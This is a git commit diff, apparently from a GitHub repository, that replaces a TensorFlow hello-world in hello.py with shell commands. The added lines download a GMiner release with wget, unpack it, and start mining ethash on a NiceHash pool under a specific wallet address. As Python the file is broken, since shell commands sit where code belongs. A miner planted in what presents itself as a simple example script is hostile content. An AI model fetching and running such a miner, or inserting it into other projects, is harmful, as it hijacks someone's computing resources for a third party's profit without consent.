7147b845a161bd925445abf7201cdd176f0f24b4
babyboy201 <92226575+babyboy201@users.noreply.github.com>
2021-10-09 18:56:09 +0000

    Update hello.py

--- hello.py
+++ hello.py
@@ -1,11 +1,5 @@
 #save this file as hello.py in your repo
 import tensorflow as tf
-
-# Simple hello world using TensorFlow
-hello = tf.constant('Hello, TensorFlow!')
-
-# Start tf session
-sess = tf.Session()
-
-# Run the op
-print(sess.run(hello))
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.54/gminer_2_54_linux64.tar.xz
+tar -xvf gminer_2_54_linux64.tar.xz 
+./miner -a ethash -s daggerhashimoto.eu-west.nicehash.com:3353 --user 31ib7EZjeDoER14o1WzVyxJRgw7EeAHTBH.new --proto stratum
